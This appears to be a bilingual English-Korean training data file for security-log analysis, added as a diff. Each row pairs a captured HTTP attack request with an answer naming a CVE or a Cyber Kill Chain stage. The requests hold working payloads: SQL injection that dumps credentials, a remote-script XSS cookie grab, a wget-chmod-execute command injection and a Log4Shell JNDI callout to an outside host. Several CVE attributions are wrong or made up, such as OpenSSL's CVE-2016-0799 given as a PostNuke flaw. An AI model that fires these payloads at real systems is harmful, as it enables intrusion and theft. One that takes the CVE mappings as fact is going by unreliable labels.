+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.","i've found cve-2016-0799, which is a sql injection vulnerability in the my_egallery module for postnuke content management system (cms). the basis for judgment is the specific mention of the ""my_egallery"" module and the usage of ""union select"" in the payload, which is a classic sqli attack technique. this cve was announced on february 22, 2016, and falls within the required time frame.","보안 분석가로서 cve-2016-0799를 발견했습니다. 이는 postnuke 컨텐츠 관리 시스템(cms)의 my_egallery 모듈에서 sql 인젝션 취약점입니다. 판단의 근거는 ""my_egallery"" 모듈에 대한 구체적 언급과 페이로드에서 ""union select"" 사용으로, 고전적인 sqli 공격 기법입니다. 이 cve는 2016년 2월 22일에 발표되었으며, 필요한 기간 내에 포함됩니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.","one relevant cve is cve-2016-9837, which was discovered in the joomla! content management system. this vulnerability occurs when a lack of proper input validation allows an attacker to inject malicious javascript code into the affected web application, leading to a successful cross-site scripting (xss) attack.","당신은 보안 분석가입니다. 관련된 하나의 취약점은 cve-2016-9837로, joomla! 콘텐츠 관리 시스템에서 발견되었습니다. 이 취약점은 적절한 입력 검증이 부족하여 공격자가 악성 자바스크립트 코드를 영향을 받는 웹 애플리케이션에 삽입할 수 있게 되어, 성공적인 크로스 사이트 스크립팅(xss) 공격이 발생하게 됩니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.","the entered payload appears to resemble the cve-2020-8515, which is a remote code execution vulnerability affecting draytek vigor devices. the judgment is based on the malicious get request and the inclusion of shell commands to download, modify permissions, and execute a file, which is a characteristic of this specific cve.","입력된 payload는 draytek vigor 장치에 영향을 미치는 원격 코드 실행 취약점인 cve-2020-8515와 유사한 것으로 보입니다. 이 판단은 악의적인 get 요청과 쉘 명령어를 사용하여 파일을 다운로드, 권한 수정 및 실행하는 것을 포함하여 이 특정 cve의 특징을 기반으로 합니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","cve-2021-44228 is a relevant vulnerability known as log4shell. it occurs due to improper handling of jndi (java naming and directory interface) references within apache log4j, a widely used java logging library, allowing remote code execution via specially crafted input such as this payload with `${jndi:ldap://}` syntax.","cve-2021-44228은 로그4쉘(log4shell)이라고 알려진 관련 취약점입니다. 이는 apache log4j라는 널리 사용되는 java 로깅 라이브러리에서 jndi(java naming and directory interface) 참조를 적절하게 처리하지 못하여 발생하며,`${jndi:ldap://}` 구문과 같은 특별하게 작성된 입력을 통해 원격 코드 실행이 가능합니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","cve-2018-19968 is a relevant vulnerability that affects phpmyadmin versions 4.0.0 to 4.8.3. the vulnerability allows an attacker to discover the configuration file (config.inc.php) by making a crafted http request, potentially leading to sensitive information disclosure and unauthorized access.","cve-2018-19968은 phpmyadmin 버전 4.0.0에서 4.8.3까지 영향을 미치는 관련 취약점입니다. 이 취약점을 통해 공격자가 조작된 http 요청을 만들어 구성 파일(config.inc.php)을 발견할 수 있으며, 이로 인해 민감한 정보 유출과 무단 접근이 발생할 수 있습니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.","cve-2019-5418: this cve is related to a path traversal vulnerability in the ruby on rails framework, which could potentially allow an attacker to access sensitive information such as the 'robots.txt' file. the basis of judgment for this cve is the presence of sensitive information in the payload and the possibility of an attacker using a bot like semrushbot to exploit the vulnerability and gain unauthorized access to the system.","cve-2019-5418 : 이 cve는 루비 온 레일즈 프레임워크에서 경로 이동 취약점과 관련되어 있으며, 이로 인해 공격자가 'robots.txt'와 같은 민감한 정보에 접근할 수 있는 가능성이 있습니다. 이 cve를 판단하는 기준은 페이로드에 민감한 정보가 포함되어 있고, 공격자가 semrushbot과 같은 봇을 사용하여 취약점을 악용하여 시스템에 무단 접근할 수 있는 가능성입니다."
+"
+In the case of the entered payload, if there is a relevant CVE (Common Vulnerabilities and Exposures) announced after 2015, please write one CVE and the basis for judgment in 2 sentences.
+",다음 payload의 경우 2015년 이후에 발표된 관련 CVE(Common Vulnerabilities and Exposures)가 있는 경우 CVE 1개와 판단 근거를 2문장으로 작성하여 주십시오.,"Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","cve-2021-20029 is a relevant vulnerability affecting wordpress wp-login.php pages which could allow attackers to carry out post-authentication server-side request forgery (ssrf) or local file inclusion (lfi) attacks. the basis for judgment is the access attempt to ""wp-login.php"" in the given payload, combined with the attacker possibly coming from an internal network, creating potential risks from unauthorized access or information leakage.","cve-2021-20029은 공격자가 후 인증 서버 측 요청 위조(ssrf) 또는 로컬 파일 포함(lfi) 공격을 수행할 수 있도록 wordpress wp-login.php 페이지에 영향을 미치는 관련 취약점입니다. 판단 근거는 주어진 페이로드의 ""wp-login.php""에 대한 접근 시도와 공격자가 내부 네트워크에서 올 가능성이 결합되어 있어, 무단 접근이나 정보 유출로 인한 잠재적 위험이 발생할 수 있습니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.","the input payload corresponds to the exploitation stage in the cyber kill chain model, as it attempts to perform an sql injection attack by injecting malicious sql code into the target web application's input fields. this step allows the attacker to gain unauthorized access to sensitive data within the web application's database.","입력 payload는 사이버 킬 체인 모델의 exploitation 단계에 해당하며, 이는 목표 웹 애플리케이션의 입력 필드에 악성 sql 코드를 삽입하여 sql 인젝션 공격을 시도합니다. 이 단계를 통해 공격자는 웹 애플리케이션 데이터베이스 내의 민감한 데이터에 무단 접근할 수 있습니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.","the input payload corresponds to the exploitation stage (stage 4) of the cyber kill chain model, as it attempts to inject malicious javascript code through an xss attack. additionally, it could be considered part of the delivery stage (stage 3) as the attacker uses an http get request to transmit the payload to the target system.","입력 payload는 사이버 킬 체인 모델의 exploitation 단계 (4단계)에 해당하는데, 이는 xss 공격을 통해 악성 자바스크립트 코드를 주입하려고 시도하기 때문입니다. 추가로, 공격자가 http get 요청을 사용하여 페이로드를 대상 시스템에 전송하는 것을 고려할 때 전달 단계 (3단계)의 일부로도 간주될 수 있습니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.","the input payload corresponds to the exploitation and installation stages of the cyber kill chain model. exploitation occurs as the attacker is attempting to gain unauthorized access to the system via the ""get /shell"" request, and installation takes place when the attacker downloads, grants permissions, and attempts to execute the ""am7"" file.","입력 payload는 사이버 킬 체인 모델의 exploitation 및 installation 단계와 관련이 있습니다. ""get /shell"" 요청을 통해 시스템에 무단 접근을 시도하는 공격자의 악용이 발생하며, ""am7"" 파일을 다운로드하고 권한을 부여하며 실행을 시도하는 과정에서 설치가 이루어집니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","the input payload corresponds to the exploitation stage in the cyber kill chain model, as it attempts to make use of a server-side template injection vulnerability by injecting jndi references inside the x-client-ip header. this stage is followed by the installation stage, wherein the attacker establishes a foothold on the target system.","입력 payload는 사이버 킬 체인 모델에서 exploitation 단계에 해당하며, 이는 서버 측 템플릿 삽입 취약점을 이용하려고 x-client-ip 헤더 내에 jndi 참조를 주입하는 것입니다. 이 단계 다음에는 설치 단계가 이어지며, 공격자가 목표 시스템에서 초소를 설립합니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","the input payload corresponds to the exploitation stage in the cyber kill chain model, as it attempts to access potentially vulnerable web applications (phpmyadmin and iis admin password change) on the targeted server. additionally, it could be associated with the reconnaissance stage, as the attacker is gathering information about the target system's configurations and potential security flaws.","입력 payload는 사이버 킬 체인 모델에서 exploitation 단계와 관련이 있으며, 대상 서버의 잠재적으로 취약한 웹 애플리케이션 (phpmyadmin 및 iis 관리자 암호 변경)에 액세스를 시도합니다. 또한, 공격자가 대상 시스템의 구성 및 잠재적 보안 결함에 대한 정보를 수집하는 정찰 단계와 관련이 있을 수 있습니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.","the input payload corresponds to the reconnaissance stage in the cyber kill chain model. this is because the payload is requesting access to 'robots.txt,' which reveals information about the website's structure that could be useful for an attacker to gather preliminary data about potential targets.","입력 payload는 사이버 킬 체인 모델의 reconnaissance 단계에 해당합니다. 이는 페이로드가 'robots.txt'에 대한 액세스를 요청하기 때문이며, 이로 인해 웹사이트의 구조 정보가 공개되어 공격자가 잠재적 목표에 대한 초기 데이터를 수집하는 데 유용할 수 있습니다."
+"
+In the case of the input payload, please write a brief description in 2 sentences, which stage it corresponds to in the Cyber Kill Chain Model.
+",다음 payload의 경우 Cyber Kill Chain Model에서 어느 단계에 해당하는지 2문장으로 간략하게 설명해주세요.,"Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","the input payload corresponds to the exploitation stage of the cyber kill chain model, as it is attempting to gain unauthorized access to a wordpress login page by redirecting to a potentially sensitive configuration file. this could potentially allow the attacker to gather information or gain control over the targeted system in subsequent stages of the attack.",입력 payload는 사이버 킬 체인 모델의 exploitation 단계에 해당하며 Word Press 로그인 페이지에 대한 무단 액세스를 시도함으로써 잠재적으로 민감한 구성 파일로 리디렉션합니다. 이를 통해 공격자가 이후 공격 단계에서 대상 시스템에 대한 정보를 수집하거나 통제할 수 있습니다.
